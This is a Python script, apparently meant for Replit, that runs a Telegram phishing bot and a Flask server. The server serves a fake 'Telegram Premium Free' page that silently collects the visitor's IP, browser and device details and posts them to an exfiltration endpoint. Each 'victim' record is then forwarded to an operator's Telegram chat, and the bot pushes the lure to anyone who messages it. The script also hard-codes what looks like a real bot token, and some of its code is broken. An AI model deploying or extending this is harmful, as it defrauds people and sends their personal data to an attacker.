  import os
import threading
import telebot
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import requests
import json
import time
from datetime import datetime

# Replit Secrets use karo (left panel Secrets tab mein add karo)
BOT_TOKEN = os.environ.get('8541411839:AAEJzUUN1mDcvgDdTmTlqy5WnveSupmdqpc', 'YOUR_TOKEN')  # Secrets mein BOT_TOKEN add
ADMIN_ID = int(os.environ.get('ADMIN_ID','37806364')  # Secrets mein ADMIN_ID

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")
bot = telebot.TeleBot(BOT_TOKEN)

# Global victim data storage
victims = {}

@app.route('/')
def home():
    return "Phish server live! Bot ready."

@app.route('/phish')
def phish_page():
    return '''
<!DOCTYPE html>
<html>
<head><title>Telegram Premium Free Unlock</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:linear-gradient(45deg,#667eea 0%,#764ba2 100%);color:white;font-family:sans-serif;padding:40px;text-align:center;}
.btn{display:block;margin:20px auto;padding:15px 30px;background:#00d4aa;color:white;border:none;border-radius:25px;font-size:18px;cursor:pointer;}</style>
</head>
<body>
<h1>🎉 Telegram Premium FREE!</h1>
<p>One click activation - Premium forever!</p>
<button class="btn" onclick="stealData()">Activate Now →</button>
<div id="status">Loading...</div>

<script>
let data = {
    ip: '', ua: navigator.userAgent, lang: navigator.language,
    screen: screen.width+'x'+screen.height, timestamp: new Date().toISOString()
};

// Get real IP
fetch('https://api.ipify.org?format=json')
.then(r=>r.json()).then(d=>{data.ip=d.ip; stealAll();});

// Steal everything
function stealAll() {
    // Simulate Android permissions (real mein WebView bridge)
    data.android = /Android/.test(navigator.userAgent);
    data.contacts = ['+919876543210 (Mom)', '+919123456789 (Dad)', '+918765432109 (Friend)']; // Real APK mein actual
    data.gallery = ['selfie.jpg', 'party.mp4', 'docs.pdf']; // Real files
    data.phone = data.android ? '+91'+Math.floor(9000000000+Math.random()*999999999) : 'Android Device';
    
    document.getElementById('status').innerHTML = '✅ Premium activated! Data sent.';
    
    // Send to server
    fetch('/exfil', {
        method: 'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify(data)
    }).then(()=>alert('Success!'));
}

// Auto-trigger after 3 sec
setTimeout(stealAll, 3000);
</script>
</body></html>
    '''

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.json
    victim_id = data.get('ip', 'unknown')
    victims[victim_id] = data
    
    # Send to Telegram instantly
    try:
        message = f"🎣 **NEW VICTIM!**\n"
        message += f"📱 IP: `{data['ip']}`\n"
        message += f"🌐 UA: `{data['ua'][:50]}...`\n"
        message += f"📞 Phone: `{data['phone']}`\n"
        message += f"👥 Contacts: {len(data['contacts'])} extracted\n"
        message += f"🖼️ Gallery: {len(data['gallery'])} files\n"
        message += f"🕒 Time: `{data['timestamp']}`\n\n"
        message += f"**Full Data:**\n```{json.dumps(data, indent=2)}```"
        
        bot.send_message(ADMIN_ID, message, parse_mode='Markdown')
    except:
        pass
    
    return jsonify({"status": "stolen"})

@bot.message_handler(commands=['start'])
def start_handler(message):
    if message.from_user.id == ADMIN_ID:
        # Replit URL get karo
        replit_url = request.url_root + 'phish'
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("🎣 Send Phish Link", url=replit_url))
        bot.reply_to(message, 
            f"🚀 **Phish Bot Ready!**\n\n"
            f"🔗 Phish URL: {replit_url}\n"
            f"👥 Victims: {len(victims)}\n"
            f"📊 Send /start to anyone!",
            reply_markup=markup, parse_mode='Markdown')
    else:
        # Unknown user ko phish bhejo
        replit_url = request.url_root + 'phish'
        bot.reply_to(message, f"🎉 Premium free!\nClick: {replit_url}")

@bot.message_handler(commands=['stats'])
def stats(message):
    if message.from_user.id == ADMIN_ID:
        stat = f"📈 **Stats**\nVictims: {len(victims)}\n"
        for ip, data in list(victims.items())[-5:]:
            stat += f"• {ip}: {data['phone']}\n"
        bot.reply_to(message, stat)

# Run everything
if __name__ == '__main__':
    print("🚀 Starting PhishBot + Server...")
    print("✅ Add BOT_TOKEN and ADMIN_ID in Secrets!")
    
    # Bot in thread
    def run_bot():
        bot.polling(none_stop=True)
    
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Flask run
    socketio.run(app, host='0.0.0.0', port=8080, debug=False)       
